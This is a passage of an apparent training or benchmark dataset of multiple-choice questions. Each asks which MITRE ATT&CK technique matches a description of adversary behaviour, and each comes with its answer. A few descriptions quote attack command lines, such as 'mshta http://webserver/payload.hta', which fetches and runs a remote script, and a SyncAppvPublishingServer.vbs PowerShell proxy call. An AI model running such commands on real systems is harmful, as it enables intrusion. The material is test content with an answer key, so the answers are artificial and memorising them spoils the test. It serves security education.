      "question": "Answer which mitre technique is related to the description: Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
      "options": "A. Automated Exfiltration: Traffic Duplication, B. Remote Service Session Hijacking, C. Execution Guardrails, D. Pre-OS Boot: System Firmware",
      "choice": "D. Pre-OS Boot: System Firmware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.\n\nA. Steal Application Access Token, B. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth, C. Obfuscated Files or Information: Command Obfuscation, D. Steal or Forge Authentication Certificates\nA:",
    "context": "",
    "output": "B. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
      "options": "A. Steal Application Access Token, B. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth, C. Obfuscated Files or Information: Command Obfuscation, D. Steal or Forge Authentication Certificates",
      "choice": "B. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.\n\nPossible answers:\nA. System Services: Service Execution, B. BITS Jobs, C. Plist File Modification, D. Modify Cloud Compute Infrastructure",
    "context": "",
    "output": "D. Modify Cloud Compute Infrastructure",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.",
      "options": "A. System Services: Service Execution, B. BITS Jobs, C. Plist File Modification, D. Modify Cloud Compute Infrastructure",
      "choice": "D. Modify Cloud Compute Infrastructure",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.\n\nA. Credentials from Password Stores: Password Managers, B. Compromise Infrastructure: Domains, C. Network Service Discovery, D. Trusted Developer Utilities Proxy Execution\nAnswer:",
    "context": "",
    "output": "A. Credentials from Password Stores: Password Managers",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.",
      "options": "A. Credentials from Password Stores: Password Managers, B. Compromise Infrastructure: Domains, C. Network Service Discovery, D. Trusted Developer Utilities Proxy Execution",
      "choice": "A. Credentials from Password Stores: Password Managers",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.\n\nPossible answers:\nA. System Location Discovery, B. Hijack Execution Flow: KernelCallbackTable, C. Exfiltration Over Physical Medium: Exfiltration over USB, D. Impair Defenses: Disable Windows Event Logging",
    "context": "",
    "output": "A. System Location Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.",
      "options": "A. System Location Discovery, B. Hijack Execution Flow: KernelCallbackTable, C. Exfiltration Over Physical Medium: Exfiltration over USB, D. Impair Defenses: Disable Windows Event Logging",
      "choice": "A. System Location Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.\nA. Masquerading: Space after Filename, B. System Network Configuration Discovery, C. Masquerading: Masquerade Task or Service, D. Obfuscated Files or Information: Software Packing",
    "context": "",
    "output": "B. System Network Configuration Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "options": "A. Masquerading: Space after Filename, B. System Network Configuration Discovery, C. Masquerading: Masquerade Task or Service, D. Obfuscated Files or Information: Software Packing",
      "choice": "B. System Network Configuration Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.extension</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\handler</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\handler\\shell\\\\action\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.\nA. Event Triggered Execution: Change Default File Association, B. Pre-OS Boot: Component Firmware, C. Indicator Removal: Network Share Connection Removal, D. System Time Discovery",
    "context": "",
    "output": "A. Event Triggered Execution: Change Default File Association",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.extension</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\handler</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\handler\\shell\\\\action\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.",
      "options": "A. Event Triggered Execution: Change Default File Association, B. Pre-OS Boot: Component Firmware, C. Indicator Removal: Network Share Connection Removal, D. System Time Discovery",
      "choice": "A. Event Triggered Execution: Change Default File Association",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>.\n\nA. Debugger Evasion, B. Automated Collection, C. Endpoint Denial of Service: OS Exhaustion Flood, D. System Network Connections Discovery\nAnswer:",
    "context": "",
    "output": "A. Debugger Evasion",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>.",
      "options": "A. Debugger Evasion, B. Automated Collection, C. Endpoint Denial of Service: OS Exhaustion Flood, D. System Network Connections Discovery",
      "choice": "A. Debugger Evasion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.\n\nA. Gather Victim Org Information: Identify Business Tempo, B. Exploit Public-Facing Application, C. Boot or Logon Autostart Execution: Kernel Modules and Extensions, D. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay\nA:",
    "context": "",
    "output": "B. Exploit Public-Facing Application",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
      "options": "A. Gather Victim Org Information: Identify Business Tempo, B. Exploit Public-Facing Application, C. Boot or Logon Autostart Execution: Kernel Modules and Extensions, D. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
      "choice": "B. Exploit Public-Facing Application",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.\nA. Transfer Data to Cloud Account, B. System Binary Proxy Execution: Mshta, C. Account Access Removal, D. User Execution: Malicious Link\nAnswer:",
    "context": "",
    "output": "B. System Binary Proxy Execution: Mshta",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "options": "A. Transfer Data to Cloud Account, B. System Binary Proxy Execution: Mshta, C. Account Access Removal, D. User Execution: Malicious Link",
      "choice": "B. System Binary Proxy Execution: Mshta",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.\n\nA. Data from Local System, B. Indicator Removal: Clear Network Connection History and Configurations, C. Access Token Manipulation: SID-History Injection, D. Debugger Evasion\nA:",
    "context": "",
    "output": "B. Indicator Removal: Clear Network Connection History and Configurations",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
      "options": "A. Data from Local System, B. Indicator Removal: Clear Network Connection History and Configurations, C. Access Token Manipulation: SID-History Injection, D. Debugger Evasion",
      "choice": "B. Indicator Removal: Clear Network Connection History and Configurations",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.\n\nFor example,  PowerShell commands may be invoked using:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`\n\nA. System Script Proxy Execution: SyncAppvPublishingServer, B. Email Collection: Local Email Collection, C. Remote Service Session Hijacking: RDP Hijacking, D. Exfiltration Over Web Service: Exfiltration Over Webhook\nAnswer:",
    "context": "",
    "output": "A. System Script Proxy Execution: SyncAppvPublishingServer",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.\n\nFor example,  PowerShell commands may be invoked using:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
      "options": "A. System Script Proxy Execution: SyncAppvPublishingServer, B. Email Collection: Local Email Collection, C. Remote Service Session Hijacking: RDP Hijacking, D. Exfiltration Over Web Service: Exfiltration Over Webhook",
      "choice": "A. System Script Proxy Execution: SyncAppvPublishingServer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project , and Azure's CLI command <code>az vm list</code> lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.\nA. Scheduled Task/Job: Systemd Timers, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Cloud Infrastructure Discovery, D. Permission Groups Discovery: Domain Groups",
    "context": "",
    "output": "C. Cloud Infrastructure Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project , and Azure's CLI command <code>az vm list</code> lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",
      "options": "A. Scheduled Task/Job: Systemd Timers, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Cloud Infrastructure Discovery, D. Permission Groups Discovery: Domain Groups",
      "choice": "C. Cloud Infrastructure Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard the technique system. Use of the technique may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some the technique systems may also result in data compression, such as gzip.\nA. Email Collection, B. Event Triggered Execution: Emond, C. Data Encoding, D. Adversary-in-the-Middle: DHCP Spoofing\nAnswer:",
    "context": "",
    "output": "C. Data Encoding",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard the technique system. Use of the technique may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some the technique systems may also result in data compression, such as gzip.",
      "options": "A. Email Collection, B. Event Triggered Execution: Emond, C. Data Encoding, D. Adversary-in-the-Middle: DHCP Spoofing",
      "choice": "C. Data Encoding",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.\nA. Hijack Execution Flow: DLL Search Order Hijacking, B. Unsecured Credentials: Cloud Instance Metadata API, C. Event Triggered Execution: Screensaver, D. Hide Artifacts: Resource Forking\nAnswer:",
    "context": "",
    "output": "A. Hijack Execution Flow: DLL Search Order Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
